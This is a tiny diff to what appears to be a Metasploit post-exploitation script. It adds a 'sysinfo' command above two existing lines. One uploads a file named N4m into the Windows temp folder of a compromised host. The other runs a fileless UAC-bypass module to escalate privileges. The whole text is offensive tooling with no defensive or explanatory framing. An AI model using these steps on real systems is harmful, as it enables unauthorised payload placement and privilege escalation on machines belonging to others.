@@ -1,2 +1,3 @@
+sysinfo
 upload IPATH/output/N4m %temp%\\N4m
 run post/windows/escalate/enigma_fileless_uac_bypass
